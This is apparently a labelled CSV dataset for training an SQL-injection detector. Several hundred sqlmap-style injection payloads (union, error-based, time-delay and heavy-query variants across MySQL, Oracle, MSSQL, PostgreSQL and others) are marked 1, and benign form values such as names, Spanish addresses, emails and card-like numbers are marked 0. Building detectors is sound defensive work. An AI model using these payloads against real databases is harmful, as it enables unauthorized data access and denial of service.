Query,Label
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll",1
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
86613661p,0
"avinguda guix borrull 170,",0
1' in boolean mode) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))#,1
enid,0
"1%"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
regir,0
73862262q,0
"1 and 3824=benchmark(5000000,md5(0x76555642))-- kvkk",1
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",1
15318,0
puebla de don fadrique,0
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",1
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
tolan.herlie@movil-google.mx,0
5609281193930681,0
"-1072%"")) or 3090=3539",1
alfio,0
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""nzhj"" like ""nzhj",1
51518827t,0
wardle,0
daroca,0
delsa,0
mwa,0
liester-okamoto@carloshoya.np,0
morneau,0
contradicha,0
aprea@ingenelec.es,0
8490972534756597,0
aquiles,0
vivie4,0
0iri1a33,0
enjergado,0
72500690k,0
modelada,0
"1%"");select sleep(5)#",1
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",1
10729,0
exigidad,0
"1%"") or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (""%""=""",1
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
no,0
petronil,0
perla,0
37718,0
"-6534%')) or make_set(4107=9457,9457) and (('%'='",1
"-8651"") where 8391=8391 union all select 8391,8391#",1
12480,0
"1%'))) union all select null,null,null,null,null,null,null,null,null#",1
"1%"") or elt(5873=5873,sleep(5))#",1
05480,0
co2posi9or,0
"-5313') union all select 7187,7187,7187#",1
mocej*n,0
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('hcpo' like 'hcpo,1
ludolfo,0
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('jfwt' like 'jfwt",1
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',1
"errekerte 113,",0
nixon@chinavende.bw,0
31392,0
hablistn,0
goyenaga,0
1')));select case when 2948=7279 then 1 else null end--,1
a2o2e5,0
berber,0
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--",1
floreal,0
hac228ej7,0
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
62162273n,0
3835247742889703,0
fincias alcoriza,0
petree,0
"calle cua, 34",0
bojanic-gidra-tolan@elcarritodelacompra.ma,0
"c/ blanquers 13, 9-b",0
2160,0
65904927z,0
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
1') as xbsc where 6772=6772;waitfor delay '0:0:5'--,1
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('sdnc'='sdnc",1
1) as qkkm where 8461=8461;select (case when (9030=9185) then 9030 else 9030*(select 9030 from information_schema.character_sets) end)#,1
"-2276"")) as qwow where 2321=2321 or 3534=2971--",1
06310,0
25270,0
"1"" where 2483=2483;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
sant hilari sacalm,0
"1 where 4787=4787;iif(1483=7301,1,1/0)",1
v5964,0
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
bartol basco,0
azuara,0
05123,0
arcediano,0
"1%' or elt(5873=5873,sleep(5))#",1
"1) where 3740=3740 union all select null,null,null,null,null,null,null,null--",1
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh",1
"1"" union all select null,null,null,null,null,null--",1
d50allecido,0
whit,0
p81i4uer3o,0
1984,0
jana,0
"1';select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
cutler.hutton@the-white-pearl-resort.int,0
lorraine,0
50228,0
howlett,0
"1') where 2120=2120;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",1
8264568534946529,0
ab_ogadora,0
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""zzkc""=""zzkc",1
sit agulla,0
"calle transversal de poniente, 71,",0
49449729m,0
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
pundyk,0
olsen,0
aldunce garbino,0
masters-mcnear@costablancarental.ax,0
nobuo,0
31243,0
8773448102181784,0
"1%' union all select null,null,null,null,null,null,null,null,null#",1
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""ikaf"" like ""ikaf",1
torterolo buix,0
"1' in boolean mode) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",1
2473968960827836,0
"-6333""))) union all select 9851,9851,9851,9851,9851,9851--",1
"-1162"")) as mhmh where 8710=8710 or make_set(4822=7598,7598)--",1
14860,0
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",1
merl,0
labandn tuto,0
1 where 3357=3357 and (9492=4334)*4334--,1
11901410z,0
"1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
0406141531828732,0
"1') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1%')) union all select null,null,null,null,null,null,null--",1
64575959d,0
"plza. alemania, 134, 12?f",0
6202740443449579,0
hindman@primeracasa-ebs.il,0
huaripuma guisasola,0
30827206f,0
1%');begin user_lock.sleep(5); end--,1
lippens27,0
cary-whitten@magritte.pe,0
5mpe92onal,0
i39str845vo,0
borobia,0
padral gracida,0
pl9t1r4,0
"1"")) as pqbs where 4409=4409;iif(1746=1730,1,1/0)",1
"sequera de haza, la",0
(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7992=7992) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)),1
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",1
"1"") and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (""pdsy"" like ""pdsy",1
rakin,0
noel,0
"1%' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and '%'='",1
"-6599%"")) or make_set(9354=9354,7185) and ((""%""=""",1
04479,0
"1%""))) rlike sleep(5)#",1
25410,0
9079098959660122,0
"-3822"")) as dftp where 2817=2817 union all select 2817,2817,2817,2817,2817,2817#",1
"-5513""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""ovmk"" like ""ovmk",1
1) waitfor delay '0:0:5'--,1
"1) where 5550=5550 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"1,(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",1
quan@arroyo-molinos.ee,0
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1"")) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((""vdyr""=""vdyr",1
"-7676"")) as flov where 7967=7967 union all select 7967--",1
ananas,0
9998088000737716,0
gorin.mccracken@evelin.am,0
48102,0
9209,0
t0na5t44la,0
gutarra marimon,0
29350,0
mediavilla buera,0
cantalejo,0
oseja,0
"1%"")) and make_set(9897=5557,5557) and ((""%""=""",1
"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
-6433%')) or 9323=9323#,1
"1') as pfwt where 8448=8448 union all select null,null,null,null,null,null,null,null,null#",1
tanitans,0
levisky,0
51942267x,0
"1"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""oxvs"" like ""oxvs",1
chuanhsi,0
"1',(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",1
12064316b,0
fal429a,0
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""qyew""=""qyew",1
inca,0
lazo,0
"1"" and elt(4249=4249,7259) and ""kgtz"" like ""kgtz",1
"-1573"") union all select 3928,3928,3928,3928--",1
jener monaj,0
jongwoei,0
lautaro,0
"-8844""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wynp",1
escudern,0
"1%')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"zoma, la",0
4908217523018940,0
prdica,0
"1"") as rovd where 3764=3764 and elt(4249=4249,7259)--",1
"1') union all select null,null,null,null,null,null,null,null,null,null--",1
"1 where 9072=9072 and elt(4249=4249,7259)--",1
1'||(select 'jslz' where 8405=8405 rlike (select * from (select(sleep(5)))sgvo))||',1
1' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'ixzr'='ixzr,1
wager.vigo@madrid2012.wf,0
"de can clos, 162",0
1%' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',1
1'+(select mavu where 4276=4276 rlike sleep(5)#,1
eslava,0
silde,0
"1') where 1363=1363;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
marrocchi,0
-7874))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((2817=2817,1
emblanquimiento,0
chalifou,0
42180,0
32493489d,0
02877417w,0
eyre9@ringringcargo.tn,0
noy,0
silvino,0
"1%')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
f,0
08781,0
hungkang,0
"1%') and 2388=benchmark(5000000,md5(0x6d457153))#",1
"1) where 1513=1513 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
valverde de burguillos,0
whiskin,0
expendedora,0
1' in boolean mode);select pg_sleep(5)#,1
cristie,0
-4137)) as elxu where 5672=5672 order by 1--,1
"1'||(select 'uebk' from dual where 6990=6990;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
"-7945%'))) union all select 4286,4286,4286,4286,4286,4286--",1
urette@elcarritodelacompra.ch,0
5132486403637449,0
bizantina,0
millana,0
0332806980099354,0
"calle roncesvalls 8,",0
1' and 2006=2006,1
"1""));if(9690=6491) select 9690 else drop function nyln--",1
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",1
-9660)) or 9762=9698,1
villarta-quintana,0
"calle el jazmin, 144 6?d",0
"1"") and (4085=4885)*4885 and (""sxte""=""sxte",1
calle pintor el greco 102 1-g,0
ayate,0
anderton,0
padre maltes 26 5a,0
san miguel de abona,0
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",1
musson@ajuntamentdebarcelona20.pr,0
9116424268966228,0
ben,0
"1' union all select null,null,null,null,null,null--",1
"1' union all select null,null,null,null,null,null,null,null,null--",1
"(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)",1
"1%"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""%""=""",1
3906482283290567,0
escamilla,0
"1') or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"c/ severo ochoa, 133 13?c",0
chimenea,0
esquilero,0
"1;select benchmark(5000000,md5(0x4c4d6142))# idxq",1
1)) as goar where 2405=2405 and 5927=9731--,1
reason@cajucar.br,0
44213,0
pearce,0
piedras albas,0
venus,0
"1%"";select case when 5559=3483 then 1 else null end--",1
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,1
baer,0
85009456f,0
"1')) as hmyc where 6732=6732 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
"1"" union all select null,null--",1
beninger,0
18310,0
soez,0
7926381447140293,0
"1 where 2292=2292 union all select null,null,null,null#",1
montorns de segarra,0
1'+(select mfcd where 6757=6757 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',1
"1""));select (case when (3565=4053) then 3565 else cast(1 as int)/(select 0 from dual) end) from dual--",1
81e9604o6o,0
meenaksh,0
segart,0
sinforiano,0
"c/ galicia, 180,",0
trisca,0
6212,0
goldsmith1@esmarbella.ht,0
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'='nkte",1
"calle archidona 27, 11?a",0
17333,0
"1"") where 9511=9511 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"-6407') or elt(1631=4946,4946) and ('jpnz'='jpnz",1
"1) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",1
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",1
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",1
9557381014556334,0
albornoz quiva,0
"1"")) and sleep(5)#",1
"joaquin nogueras 51,",0
"-5738"") as efbn where 8541=8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",1
sopista,0
1';waitfor delay '0:0:5' and 'fjpf' like 'fjpf,1
"1%"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
lobanillo,0
76415058l,0
cea,0
78,0
persson_mcclanahan@deseoun.km,0
"1'+(select ocvc where 6981=6981 union all select null,null,null,null,null,null,null,null,null,null#",1
ahe2hadora,0
pozzetto@miplat.am,0
1%')));(select * from (select(sleep(5)))acdk)#,1
4471041007969479,0
01449036j,0
"1)) as mmby where 3990=3990 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
wyle@designworld.us,0
1' where 8945=8945 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,1
24711,0
peaflor,0
piedramillera,0
"c/ rio cea, 77,",0
gontrn,0
ondorica arabia,0
24410,0
"pl. pescaderia, 158, 7-a",0
37176,0
raddalgo,0
8935,0
"josep anselm clave, 169, 13?d",0
"calle duque de ahumada, 67,",0
"1)) as mgvw where 4923=4923 union all select null,null,null,null--",1
1') as gxfu where 9676=9676;select case when 5894=4052 then 1 else null end--,1
mario caraball,0
42231079c,0
"1%""));(select * from (select(sleep(5)))srmq) and ((""%""=""",1
yoshiyam,0
"-1366' or make_set(9354=9354,7185) and 'abre'='abre",1
1') and 7533=7533,1
hurtado9,0
nelsen,0
"1"")) union all select null,null,null,null,null,null,null,null,null,null#",1
1';select sleep(5) and 'yzix'='yzix,1
higueruela,0
"1) as ujjg where 3125=3125 union all select null,null,null,null,null,null#",1
"1 where 8114=8114 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
knute,0
1')) as xqam where 6750=6750;select (case when (4205=9574) then 4205 else 1/(select 0) end)--,1
0908272174397466,0
hrdata,0
"1"") union all select null,null,null,null,null,null#",1
shiley,0
"1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
maryak,0
1784777474489263,0
alvarez 35,0
rayen,0
"1' and elt(2266=7467,7467)",1
britney,0
2237,0
fraccionaria,0
"-2009%' union all select 1991,1991#",1
1) and sleep(5)#,1
"1)) and 8635=(select count(*) from generate_series(1,5000000))--",1
bowman pinela,0
"-4408"") or 6872=6872 and (""oenu""=""oenu",1
narvate,0
tapioles,0
adgardo,0
drought,0
benavente,0
r8u9c5,0
terkel@so-tel.cx,0
92106863m,0
"-5143'+(select 'zyrr' where 8405=8405 union all select 8405,8405,8405,8405#",1
trombn,0
19371,0
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1'||(select 'fqoz' where 9794=9794 union all select null,null,null,null,null--",1
6920897670834539,0
royo mascarell,0
3933219208280602,0
9751,0
"calle enrique lopez garcia s/n,",0
"-1876'||(select 'itfc' from dual where 9584=9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",1
"1%"" union all select null,null,null,null,null,null,null#",1
mccollon@irmedia.ca,0
1'+(select 'diet' where 7004=7004 rlike sleep(5))+',1
"-2790') as xhct where 5756=5756 union all select 5756,5756#",1
avda. fernando ferrerio s/n,0
"1%"") union all select null,null,null,null,null,null--",1
1'||(select 'ptkj' from dual where 6263=6263 union all select null--,1
41t1lecti22,0
"1') where 4683=4683 and 3824=benchmark(5000000,md5(0x76555642))--",1
aulakh,0
"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('adjc'='adjc",1
durbahn,0
tajamar,0
1ici3a6te,0
quinds parini,0
valimir,0
salvina,0
"-4695'))) union all select 5844,5844,5844,5844,5844,5844#",1
burg,0
46510,0
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",1
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'usnh' like 'usnh",1
"-8950"")) as uahs where 2113=2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
somer@hotelsardegna.tg,0
1';select case when 7717=7717 then 1 else null end--,1
"1%'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('%'='",1
85amo,0
ellswort,0
49719,0
16411,0
semicopado,0
"1) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",1
"paseo constitucion, 10,",0
des9o89451rac28,0
"1') where 2725=2725 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,1
p8e8079zu58o,0
patey@suncorp.st,0
09260,0
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,1
4978848315399103,0
renan1@fichajes.nom.sd,0
620,0
"plza. leire, 1, 6?a",0
valverde de la virgen,0
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'hmqd'='hmqd",1
kelsey@helicopter.com.kh,0
9a7bl1,0
baarova@hrmsl.mil,0
"pobra do caramial, a",0
1')) as hzbj where 1725=1725 or sleep(5)#,1
"1"")) as osuh where 8809=8809;select (case when (9388=4322) then 1 else 9388*(select 9388 from master..sysdatabases) end)--",1
"1) as auly where 4146=4146 or elt(5873=5873,sleep(5))#",1
wacker,0
guipzcoa,0
acimentarse,0
c/ feria 85,0
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('yabn'='yabn",1
"1' where 7445=7445 union all select null,null,null,null,null,null--",1
2427,0
(select (case when (6986=6986) then 6986 else 6986*(select 6986 from mysql.db) end)),1
filomena,0
24596413y,0
chavez jofre,0
canino,0
"-2032%""))) or (3082=7155)*7155 and (((""%""=""",1
dosaiges,0
"bola, a",0
38449362d,0
ajuagas,0
08466616v,0
1%'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',1
1059928902417697,0
8436,0
helmos@pool-control.mx,0
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
joyan,0
"1' where 2373=2373 union all select null,null#",1
mirambell donet,0
v433g3o5i6r79,0
decapitar,0
"1) or elt(5873=5873,sleep(5))#",1
paterson,0
werling,0
"espartero, 103, 5-f",0
"1%')) or elt(6272=6272,sleep(5)) and (('%'='",1
jia,0
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""cyrb""=""cyrb",1
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""owzc"" like ""owzc",1
e2i5y,0
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'gkku' like 'gkku",1
78260205z,0
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",1
1' where 9708=9708 or sleep(5)--,1
villalba de los alcores,0
teruyuki,0
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rnyb'='rnyb",1
21292,0
"1"") and elt(3114=3114,sleep(5))#",1
8965,0
velilla de cinca,0
"jose incenga 14,",0
2417733801163656,0
"calle ducado de neopatria 63, 12-h",0
56801763c,0
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",1
per8ebimie0to,0
1%') waitfor delay '0:0:5'--,1
chua@comerciosdeaspe.om,0
"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",1
8nde9c6f3a3le,0
edouard,0
"-1956"") where 1448=1448 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",1
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",1
"-8919"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""nstr""=""nstr",1
em*barbillada,0
deimos 147 12?a,0
"1%"");select sleep(5) and (""%""=""",1
sunning,0
wolfs,0
obed9e3cia0,0
7013,0
"1)) and elt(3114=3114,sleep(5))#",1
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",1
gallocanta,0
peramola,0
"1') where 2090=2090;select count(*) from generate_series(1,5000000)--",1
jeft,0
c742na79,0
nel,0
1')));waitfor delay '0:0:5' and ((('ywnm'='ywnm,1
"1"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
bellprat,0
"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('ibrj'='ibrj",1
ewoldt vaquer,0
"1') as qqyz where 2274=2274;iif(5257=5257,1,1/0)",1
"1'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('nbsf' like 'nbsf",1
1')) as pgif where 6346=6346;if(7899=7899) select 7899 else drop function zbbp--,1
8741178125642533,0
"1%""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",1
7003,0
"-5898"")) as fycd where 7135=7135 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
"-7423 or make_set(9354=9354,7185)-- hprc",1
"labiano, s/n 7?a",0
xerta,0
22500,0
